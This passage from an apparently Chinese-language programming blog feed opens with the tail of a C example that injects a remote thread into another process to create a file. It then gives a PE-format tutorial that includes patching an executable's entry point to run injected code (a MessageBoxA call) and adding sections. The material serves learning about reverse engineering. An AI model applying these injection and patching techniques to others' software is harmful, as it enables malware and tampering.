class="line">    WriteProcessMemory(hProcess, lpFileParamAddr, &amp;GCreateFile, <span class="keyword">sizeof</span>(CREATEFILE_PARAM), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 创建远程线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpRemotThreadAddr, lpFileParamAddr, <span class="number">0</span>, &amp;dwThread);<span class="comment">// lpAllocAddr传给线程函数的参数.因为dll名字分配在内存中</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">&quot;CreateRemoteThread Error! \n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        CloseHandle(hModule);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. 关闭资源</span></span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hModule);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据进程名称获取进程ID</span></span><br><span class="line">DWORD <span class="title function_">GetPID</span><span class="params">(<span class="type">char</span> *szName)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcessSnapShot = <span class="literal">NULL</span>;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnapShot == (HANDLE)<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (Process32First(hProcessSnapShot, &amp;pe32))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szName, pe32.szExeFile)) &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="type">int</span>)pe32.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(hProcessSnapShot, &amp;pe32));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hProcessSnapShot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    RemotCreateFile(GetPID(<span class="string">&quot;进程名&quot;</span>), <span class="string">&quot;文件名&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>PE</title>
    <url>/2024/03/20/PE/</url>
    <content><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><p>可执行文件（executable file）指的是可以由操作系统进行加载执行的文件</p>
<blockquote>
<p>exe。txt之类的不是可执行文件，因为txt文件依赖exe打开。</p>
</blockquote>
<p>可执行文件格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows平台：	PE(Portable Executable)文件结构</span><br><span class="line">Linux平台：	ELF(Executable and Linking Format)文件结构</span><br></pre></td></tr></table></figure>

<p>应用</p>
<p>&lt;1&gt;病毒与犯病毒</p>
<p>&lt;2&gt;外挂与反外挂</p>
<p>&lt;3&gt;加壳与脱壳（保护与破解）</p>
<p>&lt;4&gt;无源码修改功能、软件汉化等</p>
<span id="more"></span>

<h3 id="PE指纹"><a href="#PE指纹" class="headerlink" title="PE指纹"></a>PE指纹</h3><p><img src="/2024/03/20/PE/image-20240321150124826.png" alt="image-20240321150124826"></p>
<p>开头是<code>4D 5A</code>，往后查到0x3C的位置，这里存着一个地址，<code>F0</code>，从头往后查<code>F0</code>个地址，发现是<code>50 45</code>也就是<strong>PE</strong>，这就是PE指纹。</p>
<p>.sys  .exe  .dll都符合PE文件结构，都有这样一个结构体：</p>
<img src="/2024/03/20/PE/image-20240321151527264.png" alt="image-20240321151527264" style="zoom:50%;">

<h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>DOS MZ头         DOS块	4个字的PE标识	20个字节标准PE头		224个字节的扩展PE头	40个字节第一个节表里面的数据		40个字节节表里的第二个成员		40个字节第三个成员		40个字节第四个成员		至此标准PE头结束</p>
<img src="/2024/03/20/PE/image-20240321205031681.png" alt="image-20240321205031681" style="zoom:67%;">

<h2 id="DOS头属性说明"><a href="#DOS头属性说明" class="headerlink" title="DOS头属性说明"></a>DOS头属性说明</h2><h3 id="DOS-MZ文件头结构"><a href="#DOS-MZ文件头结构" class="headerlink" title="DOS MZ文件头结构"></a>DOS MZ文件头结构</h3><p><img src="/2024/03/20/PE/image-20240321205435799.png" alt="image-20240321205435799"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注释掉的不需要重点分析</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0X00</span> WORD e_magic;      <span class="comment">//※Magic DOS signature MZ(4Dh 5Ah):MZ标记:用于标记是否是可执行文件</span></span><br><span class="line">    <span class="comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span></span><br><span class="line">    <span class="comment">//0X04 WORD e_cp;       //Pages in file</span></span><br><span class="line">    <span class="comment">//0X06 WORD e_crlc;     //Relocations</span></span><br><span class="line">    <span class="comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span></span><br><span class="line">    <span class="comment">//0X0A WORD e_minalloc; //Minimun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0E WORD e_ss;       //intial(relative)SS value</span></span><br><span class="line">    <span class="comment">//0X10 WORD e_sp;       //intial SP value</span></span><br><span class="line">    <span class="comment">//0X12 WORD e_csum;     //Checksum</span></span><br><span class="line">    <span class="comment">//0X14 WORD e_ip;       //intial IP value</span></span><br><span class="line">    <span class="comment">//0X16 WORD e_cs;       //intial(relative)CS value</span></span><br><span class="line">    <span class="comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span></span><br><span class="line">    <span class="comment">//0X1A WORD e_ovno;     //Overlay number</span></span><br><span class="line">    <span class="comment">//0x1C WORD e_res[4];   //Reserved words</span></span><br><span class="line">    <span class="comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span></span><br><span class="line">    <span class="comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span></span><br><span class="line">    <span class="comment">//0x28 WORD e_res2[10]; //Reserved words</span></span><br><span class="line">    <span class="comment">//0x3C DWORD e_lfanew;    //※Offset to start of PE header:定位PE文件，PE头相对于文件的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个结构体是16位的，但是现在的程序一般都运行在32位或64为的平台，但是有两个例外（标红的）。</p>
<p>两个红的还在使用，也就是这两个地方↓↓↓。除了这两个地方，其他的地方删了也不影响程序的正常运行。</p>
<p><img src="/2024/03/20/PE/image-20240321210416972.png" alt="image-20240321210416972"></p>
<h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS&#123;</span><br><span class="line">	DWORD Signature;		//PE头标识</span><br><span class="line">	IMAGE_FILE_HEADER FileHeader;	//标准PE头</span><br><span class="line">	IMAGE_OPTIONAL_HEADER32 OptionalHeader;		//扩展PE头</span><br><span class="line">&#125; IMAGE_NT_HEADER32,*PIMAGE_NT_HEADER32;</span><br></pre></td></tr></table></figure>

<p>PE标识：PE标识不能破坏，操作系统在启动一个程序的时候会检测这个标识</p>
<h3 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">	WORD Machine;					//可以运行在什么样的CPU上 任意：0  Intel368及以后：14C	x64:8664</span><br><span class="line">	WORD NumberOfSections;			//表示节的数量</span><br><span class="line">	DWORD TimeDateStamp;			//编译器填写的时间戳  与文件属性页面里面的创建时间、修改时间无关</span><br><span class="line">	DWORD PointerToSysbolTable;		//调试相关（不重要</span><br><span class="line">	DWROD NumberOfSys=mbols;		//调试相关（不重要</span><br><span class="line">	WORD SizeOfOptionalHeader;		//可选(扩展)PE头的大小(x32位PE文件：0xE0；x64PE文件：0xF0)</span><br><span class="line">    WORD Characteristics;			//文件属性</span><br><span class="line">&#125;	IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/20/PE/image-20240325192925364.png" alt="image-20240325192925364"></p>
<p>文件属性：</p>
<p><img src="/2024/03/20/PE/image-20240325153015448.png" alt="image-20240325153015448"></p>
<h3 id="扩展PE头"><a href="#扩展PE头" class="headerlink" title="扩展PE头"></a>扩展PE头</h3><p>32位的扩展PE头和64位的扩展PE头不太一样，这里只说32位的扩展PE头</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Magic; <span class="comment">// PE32：10B PE32+：20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion; <span class="comment">// 链接器版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion; <span class="comment">// 链接器版本号</span></span><br><span class="line">    DWORD   SizeOfCode; <span class="comment">// 所有代码节的总和（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   SizeOfInitializedData; <span class="comment">// 包含所有已经初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   SizeOfUninitializedData; <span class="comment">// 包含未初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   AddressOfEntryPoint; <span class="comment">// 程序入口</span></span><br><span class="line">    DWORD   BaseOfCode; <span class="comment">// 代码开始的基址，编译器填的（没用）</span></span><br><span class="line">    DWORD   BaseOfData; <span class="comment">// 数据开始的基址，编译器填的（没用）</span></span><br><span class="line">    DWORD   ImageBase; <span class="comment">// 内存镜像基址</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">// 内存对齐</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">// 文件对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">// 标识操作系统版本号，主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">// 标识操作系统版本号，次版本号</span></span><br><span class="line">    WORD    MajorImageVersion; <span class="comment">// PE文件自身的版本号 </span></span><br><span class="line">    WORD    MinorImageVersion; <span class="comment">// PE文件自身的版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion; <span class="comment">// 运行所需子系统版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion; <span class="comment">// 运行所需子系统版本号</span></span><br><span class="line">    DWORD   Win32VersionValue; <span class="comment">// 子系统版本的值，必须为0</span></span><br><span class="line">    DWORD   SizeOfImage; <span class="comment">// 内存中整个PE文件的映射的尺寸，且是内存对齐的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">// 所有头加节表按照文件对齐后的大小，否则加载会出错</span></span><br><span class="line">    DWORD   CheckSum; <span class="comment">// 校验和 两个字节两个字节相加，最后再加上文件长度，当两个字节相加时有溢出，让其自然溢出。最后相加得到的和就是校验和</span></span><br><span class="line">    WORD    Subsystem; <span class="comment">// 子系统，驱动程序(1)、图形界面(2) 、控制台/DLL(3)</span></span><br><span class="line">    WORD    DllCharacteristics; <span class="comment">// 文件特性 不是针对DLL的</span></span><br><span class="line">    DWORD   SizeOfStackReserve; <span class="comment">// 初始化时保留的栈大小 </span></span><br><span class="line">    DWORD   SizeOfStackCommit; <span class="comment">// 初始化时实际提交的大小 </span></span><br><span class="line">    DWORD   SizeOfHeapReserve; <span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit; <span class="comment">// 初始化时实践提交的大小 </span></span><br><span class="line">    DWORD   LoaderFlags; <span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes; <span class="comment">// 目录项数目</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">// 表，结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p><strong>Magic表示当前PE文件是32位还是64位</strong>，32位时该值对应0x10B，64位时该值对应0x20B。</p>
<p>其中的文件特性：拆分为二进制后对应的位：</p>
<img src="/2024/03/20/PE/image-20240326151008611.png" alt="image-20240326151008611" style="zoom:67%;">

<p><strong>AddressOfEntryPoint表示当前程序入口地址，</strong>这个成员与<strong>ImageBase</strong>相加才能得到真正的入口地址，成员<strong>ImageBase</strong>用来表示内存镜像基址，也就是PE文件在内存中按内存对齐展开后的首地址。</p>
<h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><img src="/2024/03/20/PE/image-20240326151849451.png" alt="image-20240326151849451" style="zoom:67%;">

<h4 id="节表数据结构说明"><a href="#节表数据结构说明" class="headerlink" title="节表数据结构说明"></a>节表数据结构说明</h4><p> 节表是一个结构体数组，每一个结构体描述一个节的信息。</p>
<img src="/2024/03/20/PE/image-20240326151949413.png" alt="image-20240326151949413" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME 8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// ASCII字符串（节名），可自定义，只截取8个字节，可以8个字节都是名字</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">// Misc，双字，是该节在没有对齐前的真实尺寸，该值可以不准确</span></span><br><span class="line">        DWORD   PhysicalAddress; <span class="comment">// 真实宽度，这两个值是一个联合结构，可以使用其中的任何一个</span></span><br><span class="line">        DWORD   VirtualSize; <span class="comment">// 一般是取后一个</span></span><br><span class="line">    &#125; Misc;					</span><br><span class="line">    DWORD   VirtualAddress; <span class="comment">// 在内存中的偏移地址，加上ImageBase才是在内存中的真正地址</span></span><br><span class="line">    DWORD   SizeOfRawData; <span class="comment">// 节在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData; <span class="comment">// 节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations; <span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   PointerToLinenumbers; <span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfRelocations; <span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfLinenumbers; <span class="comment">// 调试相关 </span></span><br><span class="line">    DWORD   Characteristics; <span class="comment">// 节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>代码中的注释可以大致了解到每个成员的作用，其中有2个成员来描述节的大小，分别是没有对齐前的真实尺寸和对齐后的宽度，这时候会出现一种情况就是对齐前的真实尺寸大于对齐后的宽度，<strong>这就是存在全局变量没有赋予初始值导致的，在文件存储中全局变量没有赋予初始值也就不占空间，但是在内存中是必须要赋予初始值的，这时候宽度就大了一些，</strong>所以在内存中节是谁大就按照谁去展开。</p>
<p><img src="/2024/03/20/PE/image-20240326202315229.png" alt="image-20240326202315229"></p>
<p>节的属性：将四个位全部展开后对应下表</p>
<p><img src="/2024/03/20/PE/image-20240326201156279.png" alt="image-20240326201156279"></p>
<h2 id="RVA与FOA的转换"><a href="#RVA与FOA的转换" class="headerlink" title="RVA与FOA的转换"></a>RVA与FOA的转换</h2><p>问题：如果想改变一个全局变量的初始值，该怎么做？</p>
<p>有初始值的全局变量和没有初始值的全局变量在PE文件中是不一样的。没有初始值的全局变量在PE文件中根本没有他的位置，只有在运行时内存展开后才会给他分配一个0；有初始值的全局变量的值是已经在PE文件中。</p>
<img src="/2024/03/20/PE/image-20240328143419116.png" alt="image-20240328143419116" style="zoom:67%;">

<p>这个地址是在内存展开后的地址，直接在PE文件中找这个地址肯定不行，因为PE文件静态和动态的地址肯定不一样。</p>
<img src="/2024/03/20/PE/image-20240328143817385.png" alt="image-20240328143817385" style="zoom:50%;">

<p>所以要把动态时的地址转换成PE文件静态地址。</p>
<p>这两种状态的地址相互转换，可以称为RVA与FOA的转换，<strong>RVA</strong>就是相对虚拟地址（Relative Virtual Address）（动态），<strong>FOA</strong>就是文件偏移地址（File Offset Address）（静态），FOA和内存无关，它是某个位置距离文件头的偏移。</p>
<p><img src="/2024/03/20/PE/image-20240328150556759.png" alt="image-20240328150556759"></p>
<ol>
<li>RVA地址由内存地址减去ImageBase地址（PE文件在内存中的开始位置是由扩展PE头中的ImageBase决定）；</li>
<li>判断RVA地址是否位于PE头中：<ol>
<li><strong>如果是，那么RVA等于FOA</strong>；</li>
<li><strong>如果不是，判断RVA位于哪个节：</strong><ol>
<li>当满足<strong>RVA地址大于等于节.VirtualAddress和RVA地址小雨等于节.VirtualAddress加上当前节内存对齐后的大小</strong>时，就表示RVA地址在该节中。</li>
<li>RVA地址减去节.VirtualAddress等于差值，<strong>FOA地址就是根据节.PointerToRawData加上差值</strong>。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>在一些较老的编译器中，编译出来的文件会区分文件对齐、内存对齐，但是在现在的编译器编译出来的程序，文件对齐与内存对齐时完全一样的，所以我们不用费这么大的周折，我们只需要算出RVA的值就可以得出FOA的值。</p>
<h2 id="空白区添加代码"><a href="#空白区添加代码" class="headerlink" title="空白区添加代码"></a>空白区添加代码</h2><p>目标：打开程序时首先弹出一个窗口。</p>
<p>&lt;1&gt;构造要写入的代码<br>&lt;2&gt;在PE的空白区构造一段代码<br>&lt;3&gt;修改入口地址为新增代码位置<br>&lt;4&gt;新增代码执行后，跳回入口地址</p>
<p>构造要写入的代码，比如调用一个MessageBoxA。在VS中查看反汇编可以发现调用MessageBoxA的时候先有4个<code>push 0</code>，然后是一个调用。在编译器中看到的调用是间接调用，如果要写到PE文件中需要使用直接调用。</p>
<p>首先打开一个exe程序，查看一下MessageBoxA在内存中的地址。因为user32.dll中的地址是不会变的，所以直接拿过来就可以使用（同一台电脑一样，但是每台电脑不一样）。</p>
<p>使用<code>call</code>时，硬编码为<code>E8</code>，后面跟的地址应该是地址偏移。计算公式为<code>目标地址 - E8所在地址 - 5 = E8后面应该写的值</code>。</p>
<p>通过查询得MessageBoxA的地址为<code>751DA0E0</code>。</p>
<p>如果将E8写在0x3A8处，那么E8后面应该加的值为<code>751DA0E0 - 4003A8 - 5 = 74 DD 9D 33</code>。</p>
<img src="/2024/03/20/PE/image-20240330134830550.png" alt="image-20240330134830550" style="zoom:50%;">

<p>执行完这段代码之后，还要跳转回原先的程序入口。</p>
<p><img src="/2024/03/20/PE/image-20240330134931128.png" alt="image-20240330134931128"></p>
<p>在扩展PE头中查到这个地址是0x11023。所以还要计算E9后面跟的值。</p>
<p><code>0x411023 - 0x4003AD - 5 = 10C71</code></p>
<p>所以：<img src="/2024/03/20/PE/image-20240330135148603.png" alt="image-20240330135148603" style="zoom: 45%;"></p>
<p>这时添加的代码就完成了，最后还需要把文件开始执行的地址改成E8前面开始push的地址，也就是0x3A0。</p>
<p><img src="/2024/03/20/PE/3b7099b3a1cfc3c7826169ef678318f.png" alt="3b7099b3a1cfc3c7826169ef678318f"></p>
<h2 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h2><p>当我们需要插入的代码比较多时，如果只在节表后面的空白区域添加是不够的，所以可以在某一个节中添加，因此扩大一个节。</p>
<p>扩大节时，最好是扩大最后一个节，因为如果要扩大前面的节的话，后面每一个节的属性都需要修改。所以扩大最后一个节。</p>
<p>首先在文件的最后，插入需要的大小，比如扩大最后一个节0x1000(DEC:4096)</p>
<p><img src="/2024/03/20/PE/image-20240330160701699.png" alt="image-20240330160701699"></p>
<p>一个节表的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME ``8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; ``<span class="comment">// ASCII字符串（节名），可自定义，只截取8个字节，可以8个字节都是名字</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> ``<span class="comment">// Misc，双字，是该节在没有对齐前的真实尺寸，该值可以不准确</span></span><br><span class="line">        DWORD   PhysicalAddress; ``<span class="comment">// 真实宽度，这两个值是一个联合结构，可以使用其中的任何一个</span></span><br><span class="line">        DWORD   VirtualSize; ``<span class="comment">// 一般是取后一个</span></span><br><span class="line">    &#125; Misc;					</span><br><span class="line">    DWORD   VirtualAddress; ``<span class="comment">// 在内存中的偏移地址，加上ImageBase才是在内存中的真正地址</span></span><br><span class="line">    DWORD   SizeOfRawData; ``<span class="comment">// 节在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData; ``<span class="comment">// 节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations; ``<span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   PointerToLinenumbers; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfRelocations; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfLinenumbers; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    DWORD   Characteristics; ``<span class="comment">// 节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>想要扩大节就需要修改SizeOfRawData、VirtualSize。</p>
<p><img src="/2024/03/20/PE/image-20240330162850162.png" alt="image-20240330162850162"></p>
<p><img src="/2024/03/20/PE/image-20240330163011905.png" alt="image-20240330163011905"></p>
<h3 id="扩大节的步骤"><a href="#扩大节的步骤" class="headerlink" title="扩大节的步骤"></a>扩大节的步骤</h3><p>&lt;1&gt; 分配一块新的空间，大小为S</p>
<p>&lt;2&gt; 将最后一个节的SizeOfRawData和VirtualSize改成N</p>
<p>​		N &#x3D; （SizeOfRawData或者VirtualSize内存对齐后的值) + S			SizeOPfImageData和VirtualSize谁大选谁 </p>
<p>&lt;3&gt; 修改SizeOfImage大小</p>
<h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><p>扩大节时可能会影响扩大的最后一个节，因为修改了该节的属性，可能从只读变成可读可写，影响代码的执行。</p>
<h3 id="新增节的步骤"><a href="#新增节的步骤" class="headerlink" title="新增节的步骤"></a>新增节的步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt; 判断是否有足够的空间，可以增加一个新节表</span><br><span class="line"></span><br><span class="line">&lt;2&gt;在节表中新增一个成员</span><br><span class="line"></span><br><span class="line">&lt;3&gt;修改PE头中节的数量</span><br><span class="line"></span><br><span class="line">&lt;4&gt;修改SizeOfImage的大小</span><br><span class="line"></span><br><span class="line">&lt;5&gt;在原有数据的最后，新增一个节的数据（内存对齐的整数倍）</span><br><span class="line"></span><br><span class="line">&lt;6&gt;修正新增节表的属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="新增节-1"><a href="#新增节-1" class="headerlink" title="新增节"></a>新增节</h3><h4 id="有空间新增一个节表"><a href="#有空间新增一个节表" class="headerlink" title="有空间新增一个节表"></a>有空间新增一个节表</h4><img src="/2024/03/20/PE/image-20240408195256004.png" alt="image-20240408195256004" style="zoom:35%;">

<h4 id="复制一份节表"><a href="#复制一份节表" class="headerlink" title="复制一份节表"></a>复制一份节表</h4><p>可以复制一份.text节表，这个节表用来存储执行代码，不需要修改节的属性</p>
<p><img src="/2024/03/20/PE/image-20240408195702299.png" alt="image-20240408195702299"></p>
<p>加到后面，改一个名字</p>
<p>在标准PE头中，第二个成员是节的数量，本来有6个节，现在加一个节，改成7</p>
<p><img src="/2024/03/20/PE/image-20240408195808690.png" alt="image-20240408195808690"></p>
<p>为了方便添加节，还需要修改一下最后一个节表成员的属性，将其真实大小（VirtualSize）修改成文件对齐之后的大小（SizeOfRawData）：</p>
<p><img src="/2024/03/20/PE/image-20240409085156500.png" alt="image-20240409085156500"></p>
<p>接着修改添加的节表成员的属性：名字、真实大小（0x1000）、文件对齐之后的大小（0x1000）、内存中的偏移（第4个节的偏移地址0x74000+其数据大小0x4000）、文件中的偏移：</p>
<p><img src="/2024/03/20/PE/image-20240409085933456.png" alt="image-20240409085933456"></p>
<p>SizeOfImage + 0x1000</p>
<p><img src="/2024/03/20/PE/image-20240409091935619.png" alt="image-20240409091935619"></p>
<p>然后再文件最后插入0x1000的数据即可（4096字节）</p>
<p>这样新增节就完成了，然后可以在新增的节中增加要执行的代码</p>
<h2 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h2><p>上一章中了解到新增节需要在节表之后至少有40个字节的空白区给我们去新增，但并不是所有的程序都可以满足这个条件，如下图所示的程序在节表之后的数据是编译器填充的，这些数据并不能覆盖：</p>
<p><img src="/2024/03/20/PE/image2021-12-28_15-44-45.png" alt="images/download/attachments/1015828/image2021-12-28_15-44-45.png"></p>
<p>(视频看不了，见在线笔记)</p>
<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>一个可执行程序是由多个PE文件组成的，一个exe运行的时候，不仅有exe文件，还有一堆dll文件</p>
<p>exe中的<strong>导入表</strong>存储了这个程序需要用哪些dll</p>
<p><strong>导出表</strong>中存储了这个PE文件中的哪些函数需要提供给别人使用。</p>
<p>通常情况下，exe不提供函数给别人用，也就是一般没有导出表吗，但是不代表exe不能有导出表。</p>
<p>dll文件通常会调用其他函数，其他的exe或dll也会调用其中的函数，所以dll一般既有导出表，也有导入表。</p>
<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><p>找到PE头最后一个成员结构体数组，</p>
<p>然后找到该结构体数组的第一个结构体，里面包含了导出表的相对虚拟地址和导出表所占大小。</p>
<p><img src="/2024/03/20/PE/image-20240515143123896.png" alt="image-20240515143123896"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VirtualAddress：0x10000</span><br><span class="line">Size：0x7AE</span><br></pre></td></tr></table></figure>

<p>根据SectionAlign和FileAlign计算出导出表所在的位置</p>
<img src="/2024/03/20/PE/image-20240515150034086.png" alt="image-20240515150034086" style="zoom:50%;">

<p>然后就能找到导出表</p>
<img src="/2024/03/20/PE/image-20240515150229847.png" alt="image-20240515150229847" style="zoom:80%;">

<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><h3 id="导入表——确定依赖模块"><a href="#导入表——确定依赖模块" class="headerlink" title="导入表——确定依赖模块"></a>导入表——确定依赖模块</h3><p>和导出表一样，找到节表上面的结构体数组，找到第二个结构体成员。</p>
<p>因为打开的是一个exe，所以导出表是00 00 00 00（一般）</p>
<p><img src="/2024/03/20/PE/image-20240515222312319.png" alt="image-20240515222312319"></p>
<p>这里存储导入表RVA和Size：RVA-&gt;0x4BB74，Size-&gt;0x64</p>
<p>这个exe的SectionAlign和FileAlign不相同，所以先将RVA转换成FOA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SectionAlign：0x1000</span><br><span class="line">FileALign：0x200</span><br></pre></td></tr></table></figure>

<p>RVA：0x4BB74 -&gt; FOA：0x4AB74，VA：0x14004BB74</p>
<p><img src="/2024/03/20/PE/image-20240516083214817.png" alt="image-20240516083214817"></p>
<p>这个exe总共有4个依赖模块，最后由20个0结束。</p>
